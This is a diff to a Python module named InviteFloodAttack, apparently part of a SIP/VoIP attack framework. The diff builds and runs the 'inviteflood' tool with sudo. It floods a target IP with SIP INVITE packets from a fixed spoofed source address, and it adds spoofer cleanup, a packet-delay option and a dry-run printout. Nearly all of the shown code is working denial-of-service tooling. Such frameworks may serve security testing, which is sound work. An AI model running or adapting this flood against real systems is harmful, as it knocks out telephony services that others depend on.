@@ -9,7 +9,7 @@ from pathlib import Path
 from typing import List, Optional
 from utils.attack.attack_enums import AttackProtocol, AttackType
 from utils.config.config import Parameters
-from utils.core.logs import print_error, print_info, get_logger
+from utils.core.logs import print_error, print_info, get_logger, print_warning
 from utils.interfaces.attack_interface import AttackInterface
 from utils.registry.metadata import ModuleInfo
 from utils.core.command_runner import run_command_str
@@ -105,7 +105,14 @@ class InviteFloodAttack(AttackInterface):
 
     def cleanup(self) -> None:
         print_info("Cleaning up InviteFlood attack resources")
-        # Implement any necessary cleanup logic here
+        # Stop spoofing if it was enabled
+        if hasattr(self, 'spoofer') and self.spoofer:
+            print_info("Stopping spoofer as part of cleanup...")
+            try:
+                self.stop_spoofing()
+            except Exception as e:
+                print_error(f"Error stopping spoofer during cleanup: {e}")
+        # Implement any other necessary cleanup logic here
     
     def end(self):
         print_info("Ending the InviteFlood attack")
@@ -115,25 +122,47 @@ class InviteFloodAttack(AttackInterface):
     def run(self) -> None:
         print_info("Running InviteFlood attack")
         
+        # Build the inviteflood command with required and optional arguments
+        command = (
+            f"inviteflood "
+            f"{self.interface} "
+            f'200 '  # target user (empty string for all)
+            f"{self.target_ip} "  # target domain (using IP)
+            f"{self.target_ip} "  # IPv4 addr of flood target
+            f"{self.max_count} "  # flood stage (number of packets)
+            f"-i 10.10.123.1 "  # source IP address
+            f"-S {self.source_port} "  # source port
+            f"-D {self.target_port} "  # destination port
+        )
+        
+        # Add delay parameter if specified (convert seconds to microseconds)
+        if self.delay > 0:
+            delay_microseconds = int(self.delay * 1000000)  # Convert seconds to microseconds
+            
+            # Add validation to prevent integer overflow issues
+            max_microseconds = 2147483647  # Max 32-bit signed integer
+            if delay_microseconds > max_microseconds:
+                print_warning(f"Delay {delay_microseconds} microseconds exceeds maximum. Capping to {max_microseconds}.")
+                delay_microseconds = max_microseconds
+            
+            command += f" -s {delay_microseconds}"
+        
         if self.dry_run:
-            print_info("Dry run mode: would execute inviteflood command")
+            print_info("Dry run mode: would execute the following command:")
+            print_info(f"Command: {command}")
             print_info(f"Would attack target: {self.target_ip}:{self.target_port}")
+            if self.delay > 0:
+                print_info(f"Delay between packets: {self.delay} seconds ({int(self.delay * 1000000)} microseconds)")
             return
             
-        # Build the inviteflood command with required and optional arguments
+        # Execute the command
         try:
-            command = (
-                f"inviteflood "
-                f"{self.interface} "
-                f'200 '  # target user (empty string for all)
-                f"{self.target_ip} "  # target domain (using IP)
-                f"{self.target_ip} "  # IPv4 addr of flood target
-                f"{self.max_count} "  # flood stage (number of packets)
-                f"-i 10.10.123.1 "  # source IP address
-                f"-S {self.source_port} "  # source port
-                # f"-D {self.target_port} "  # destination port
-            )
             run_command_str(command, want_sudo=True, capture_output=False, check=True)
+            
+            # Attack completed successfully, clean up spoofer
+            print_info("InviteFlood attack completed successfully")
+            self.end()
+            
         except Exception as e:
             print_error(f"Failed to run InviteFlood attack: {e}")
             self.cleanup()
